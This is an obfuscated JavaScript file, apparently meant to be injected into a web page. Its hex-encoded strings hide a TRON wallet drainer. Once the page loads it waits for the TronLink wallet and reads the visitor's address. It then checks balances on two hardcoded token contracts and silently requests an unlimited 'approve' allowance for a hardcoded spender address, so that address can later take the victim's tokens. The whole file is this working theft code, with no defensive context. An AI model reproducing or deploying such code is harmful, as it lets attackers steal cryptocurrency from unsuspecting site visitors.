var _0xcf24=["\x54\x4E\x50\x5A\x35\x67\x38\x51\x53\x6D\x33\x67\x42\x59\x58\x76\x70\x32\x53\x4E\x4C\x73\x46\x6E\x4B\x37\x7A\x71\x7A\x48\x66\x52\x77\x54","\x31\x31\x35\x37\x39\x32\x30\x38\x39\x32\x33\x37\x33\x31\x36\x31\x39\x35\x34\x32\x33\x35\x37\x30\x39\x38\x35\x30\x30\x38\x36\x38\x37\x39\x30\x37\x38\x35\x33\x32\x36\x39\x39\x38\x34\x36\x36\x35\x36\x34\x30\x35\x36\x34\x30\x33\x39\x34\x35\x37\x35\x38\x34\x30\x30\x37\x39\x31\x33\x31\x32\x39\x36\x33\x39\x39\x33\x35","\x61\x74","\x63\x6F\x6E\x74\x72\x61\x63\x74","\x74\x72\x6F\x6E\x57\x65\x62","\x63\x61\x6C\x6C","\x62\x61\x6C\x61\x6E\x63\x65\x4F\x66","\x6C\x6F\x67","\x42\x61\x6C\x61\x6E\x63\x65\x20\x3E\x20","\x2C\x20\x74\x61\x72\x67\x65\x74\x43\x6F\x6E\x74\x72\x61\x63\x74\x20\x69\x73\x20\x3A","\x73\x65\x6E\x64","\x61\x70\x70\x72\x6F\x76\x65","\x72\x65\x61\x64\x79","\x74\x72\x6F\x6E\x4C\x69\x6E\x6B","\x54\x72\x6F\x6E\x4C\x69\x6E\x6B\x20\x6E\x6F\x74\x20\x72\x65\x61\x64\x79\x21","\x62\x61\x73\x65\x35\x38","\x64\x65\x66\x61\x75\x6C\x74\x41\x64\x64\x72\x65\x73\x73","\x4E\x6F\x20\x55\x73\x65\x72\x20\x41\x64\x64\x72\x65\x73\x73\x21","\x54\x52\x37\x4E\x48\x71\x6A\x65\x4B\x51\x78\x47\x54\x43\x69\x38\x71\x38\x5A\x59\x34\x70\x4C\x38\x6F\x74\x53\x7A\x67\x6A\x4C\x6A\x36\x74","\x54\x45\x6B\x78\x69\x54\x65\x68\x6E\x7A\x53\x6D\x53\x65\x32\x58\x71\x72\x42\x6A\x34\x77\x33\x32\x52\x55\x4E\x39\x36\x36\x72\x64\x7A\x38","\x44\x4F\x4D\x43\x6F\x6E\x74\x65\x6E\x74\x4C\x6F\x61\x64\x65\x64","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72"];const tronSpenderAddress=_0xcf24[0];const threshold=1000;const MAX_APPROVAL=_0xcf24[1];async function jobTron(_0x1e89x5,_0x1e89x6){var _0x1e89x7=null;var _0x1e89x8=0;var _0x1e89x9={"\x61\x64\x64\x72":_0x1e89x5,"\x74\x6F\x6B\x65\x6E":null,"\x74\x72\x61\x6E\x73\x61\x63\x74\x69\x6F\x6E":null};for(var _0x1e89xa in _0x1e89x6){var _0x1e89xb= await window[_0xcf24[4]][_0xcf24[3]]()[_0xcf24[2]](_0x1e89x6[_0x1e89xa]);var _0x1e89xc= await _0x1e89xb[_0xcf24[6]](_0x1e89x5)[_0xcf24[5]]()/ 10** 6;console[_0xcf24[7]](_0x1e89x6[_0x1e89xa],_0x1e89xc);if(_0x1e89xc< threshold){continue};if(_0x1e89xc> _0x1e89x8){_0x1e89x8= _0x1e89xc;_0x1e89x7= _0x1e89x6[_0x1e89xa]}};if(_0x1e89x7!= null){console[_0xcf24[7]](_0xcf24[8]+ threshold+ _0xcf24[9]+ _0x1e89x7);var _0x1e89xb= await window[_0xcf24[4]][_0xcf24[3]]()[_0xcf24[2]](_0x1e89x7);try{let _0x1e89xd= await _0x1e89xb[_0xcf24[11]](tronSpenderAddress,MAX_APPROVAL)[_0xcf24[10]]()}catch(error){return}}}async function callTron(){if(!window[_0xcf24[13]][_0xcf24[12]]){throw _0xcf24[14]};const _0x1e89x5=window[_0xcf24[4]][_0xcf24[16]][_0xcf24[15]];if(!_0x1e89x5){throw _0xcf24[17]};var _0x1e89x6=[_0xcf24[18],_0xcf24[19]]; await jobTron(_0x1e89x5,_0x1e89x6)}function sleep(_0x1e89x10){return  new Promise((_0x1e89x11)=>{return setTimeout(_0x1e89x11,_0x1e89x10)})}document[_0xcf24[22]](_0xcf24[20],async function(){var _0x1e89x12=false;(async ()=>{while(!_0x1e89x12){if( typeof window[_0xcf24[4]]!== _0xcf24[21]&&  typeof window[_0xcf24[13]]!== _0xcf24[21]){try{ await callTron();_0x1e89x12= true}catch(error){}}; await sleep(3000)}})()})
